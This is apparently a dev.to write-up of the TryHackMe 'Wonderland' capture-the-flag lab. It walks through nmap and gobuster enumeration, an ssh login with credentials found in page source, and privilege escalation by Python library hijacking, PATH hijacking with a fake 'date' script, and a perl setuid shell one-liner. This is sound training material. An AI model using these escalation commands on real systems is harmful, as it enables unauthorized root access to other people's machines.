# Let's Explore Wonderland: The Try Hack Me CTF. 🐰

I've never really been a big Alice in Wonderland fan. I don't hate it, but it's not my favorite piece of literature. That aside, I really enjoyed this CTF (except the last part, but we'll get to that later). Get ready to fall into some holes, because we are about to hack Wonderland. 🐰

---

## Obtain the flag in user.txt
Okay, first things first. When we start our machine and we navigate to the given IP in our browser, we are given the following objective: "Follow the White Rabbit". Inspecting the page source, we can see that there are no hidden values for us to see, so we need to move on to our enumeration.
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/nz93l1209h3vss1v6dyb.png)
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hkfkgm0mpbt9xue9315i.png)
 
Start up your terminal and run a good ol' nmap scan. We can see two services that are running: **ssh and http**.
`nmap -sV -sC -Pn <your machine IP>`
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dhih3j3oogkonful6ycs.png)

Next, run a gobuster scan so we can see if there are any directories which are hidden. There are a few - but the most important one is the **/r** directory.
`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u <your machine IP> -t 50`
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xds87fsdctqvheex1qgc.png)

When we go to the **/r** directory in our browser, it tells us to keep going. Let's run another gobuster scan.
`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u <your machine IP>/r -t 50`
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/apcqsggmehpfe7tjc7r0.png)
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/165o9hvfyts71b67zvb4.png)

Note that you can skip doing the manual enumeration for each directory by running a normal gobuster scan with a -R flag at the end. We can see that there is a **/r/a** directory. You can probably guess where this is going (the next one will be /b/b/i/t).
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/bdz61dkg9n0i1d6ify0g.png)

Let's follow the white rabbit to the end by going to the **/r/a/b/b/i/t** directory! When we inspect the page source, we can see that we have found Alice's username and password for a potential ssh login.
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yeul3l2z8pmtgg7dwh2d.png)
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/64vhcj0lu0bygjtatmld.png)

Okay! Now, let's open up our terminal and log into our ssh service using our found credentials.
`ssh alice@<your machine IP>`
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/l57l4ier3djp5gk2nzwn.png)

When we list the files in our current directory, we find that we have a root.txt and a walrus_and_the_carpenter.py file. We will use come back to these files later. 
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ur5dxprrq3w59ehpyyu7.png)
 
For now, let's find and read the contents of our user.txt file, which is located under root (hence the hint, everything is upside down in here!).
`cat /root/user.txt`
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/na2j6iapz8js8qnf3b94.png)
 
Hoorah! We've found our user.txt flag!
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/t4xi4sift6la76fu6tv4.png)
 
---

## Escalate your privileges, what is the flag in root.txt?
Okay, remember when I said we'd get back to our root.txt and a walrus_and_the_carpenter.py files? Well, cd back into the /home/alice directory and let's analyse these files again. We do not have permission to read the contents of the `root.txt` file, and the `walrus_and_the_carpenter.py` imports the random module in python which returns a random poem.

```python
//contents of walrus_and_the_carpenter.py (I forgot to take a screenshot)

import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
............................
............................
And that was scarcely odd, because
Theyd eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

Let's see what commands Alice can run in our current environment. 
`sudo -l`
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ql8uqkcjog8m6issm4wy.png)

We can see that Alice can run the `/usr/bin/python3.6 walrus_and_the_carpenter.py` command (as one single string) to escalate her privilege to Rabbit. Now, we can exploit that random module that is imported above via [Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/). We will do this by creating a `random.py` file in our current `/home/alice` directory, adding contents into it via nano and then running our command. 

**<u>Carefully follow the steps below:</u>**
1. Make sure you are in the /home/alice directory, then create a new file via the `touch random.py` command.
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/zmke0axprss1bsxatnmo.png)

2. Then, open up nano so that we can insert our script in this file via `nano random.py`.
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a10c9290nq1c7g17lz8r.png)
 
3. With nano opened, insert the following script and save:
```python
import os

os.system("/bin/bash")
```
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3g2t2paj5wgn8yvr6zwo.png)

3. Finally, we can commence with our privilege escalation from user Alice to User Rabbit via the following command:
`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py` 
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/k7zsctlla6mkvbop5mcy.png)
 
We now have access to the system as Rabbit. Let's see what we can find in the `/home/rabbit` directory. There is a single executable: ./teaParty.
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rw0z77grojgst80jhqbx.png)

When we run this executable, we can see that there is an odd string "Probably by Sat, 11 Jun 2022 13:16:45 +0000".
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/as8kppkveeucqaj3cs7f.png)

If we read this file with nano, we can see that it is calling upon a date file.
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1t7vp2tnngndr610l45z.png)

Before we continue, lets see what access we have to this teaParty executable by running: `ls -la`.
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vqmtbpw7ubdne95jivyp.png)

Fortunately, we can escalate our privilege from Rabbit to root by spawning root privilege via the [Echo Command](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/) hack (we will do this by modifying our date file in our /tmp direcotory). 

**<u>Carefully enter the commands as sequenced below:</u>**
1. `cd /tmp`
2. `echo "/bin/bash" > date`
3. `chmod 777 date`
4. `echo $PATH`
5. `export PATH=/tmp:$PATH`
6. `cd /home/rabbit`
7. `./teaParty`

![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6bgkn6cnncnrnu61t4pv.png)
 
We now have access as Hatter! When we see which privileges he has, we see an interesting file: `password.txt`. We now have the password for Hatter!
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/k6cx3dllt9ho3r1j6i5x.png)
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pkdhh0wvzej27vrutaz5.png)

Unfortunately, Hatter does not have any sudo capabilities (try this by running `sudo -l`). Now this is where my struggle started. I used [GTFObins](https://gtfobins.github.io/) to find a list of binaries that we can exploit to escalate our environments' capabilities so that we can run sudo as Hatter. We will do so via [perl](https://gtfobins.github.io/gtfobins/perl/).
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fk9u032gx3gqz68rvnaw.png)
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7tui1xjk3nsk9iu6wco9.png)

In your terminal run the command below. I kept on getting permission denied, so I had to restart my OPENVPN connection, and then I got in! Unfortunately, I was so tired by then, that I forgot to take screenshots. I guess you can say I fell into a deep hole. 😒
`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/09nkfkoxzdws7yzc1dsh.png)
 
You can now cd into and read the contents of our `/home/alice/root.txt` directory. We got our flag!
![Wonderland CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/um8h5h2d2h2yh85880vm.png) 
 
---

## Conclusion
Things got pretty messy there at the end, so I apologize for that. I guess this write-up is as upside down as the lab itself. 🙃

![Wonderland CTF](https://media.giphy.com/media/112DkdWt71IIpO/giphy.gif)

I hope that this was easy enough for you to follow, and until next time, happy hacking! 😁

